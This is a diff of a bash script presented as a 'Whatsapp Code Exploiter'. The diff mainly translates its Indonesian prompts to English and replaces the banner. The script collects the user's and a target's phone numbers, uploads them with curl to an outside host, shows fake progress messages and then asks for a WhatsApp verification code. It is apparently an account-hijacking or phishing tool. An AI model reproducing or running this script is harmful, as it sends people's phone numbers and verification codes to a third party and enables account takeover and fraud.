@@ -2,15 +2,15 @@
 clear
 echo "
 <-- IndoSec -->
-####################
-#   Whatsapp Code  # By ./C3W3KBerB4T4n9
-#     Exploiter    # ceweberbatang59@gmail.com
-####################
+======================
+¦¦   Whatsapp Code  ¦¦
+¦¦     Exploiter    ¦¦
+======================
 
-Copyright (c) 2018 ceweberbatang Ganteng";
+
 echo "";
-read -p "Nomer Kamu (+62xxxx)=> " nomer;
-read -p "Nomer Target (+62xxxx) => " target;
+read -p "Your Number(+62xxxx)   => " nomer;
+read -p "Target Number(+62xxxx) => " target;
 sleep 2
 echo "[+] Syncing Target...";
 sleep 1
@@ -23,7 +23,7 @@ echo "Nomer => $nomer" >> kontol.html;
 curl -T kontol.html http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
-echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
+echo "Wait 5-10 minutes to get the code.";
 read -p "Verify Code => " code;
 sleep 2
 echo "[+] Connecting to whatsapp.com...";
